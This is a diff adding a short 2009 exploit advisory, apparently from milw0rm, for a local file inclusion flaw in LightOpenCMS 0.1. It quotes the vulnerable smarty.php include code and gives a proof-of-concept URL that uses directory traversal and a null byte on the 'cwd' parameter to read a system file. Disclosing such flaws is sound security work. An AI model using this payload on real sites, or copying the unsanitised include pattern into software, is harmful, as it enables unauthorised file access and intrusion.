@@ -1,0 +1,19 @@
+LightOpenCMS 0.1 (smarty.php cwd) Local File Inclusion Vulnerability
+bug found by Jose Luis Gongora Fernandez (a.k.a) JosS
+
+contact: sys-project[at]hotmail.com
+website: http://www.hack0wn.com/
+
+- download: http://sourceforge.net/project/showfiles.php?group_id=251474
+
+[smarty.php]
+ define("SMARTY_DIR", $cwd."/smarty/");
+ require_once(SMARTY_DIR."/Smarty.class.php");
+
+PoC:
+ [php.ini] register_globals= On
+ http://localhost/locms/smarty.php?cwd=../../../../../../../../../../../../boot.ini%00
+
+Greetz: YEnH4ckEr, str0ke and spanish hackers!
+
+# milw0rm.com [2009-06-24]
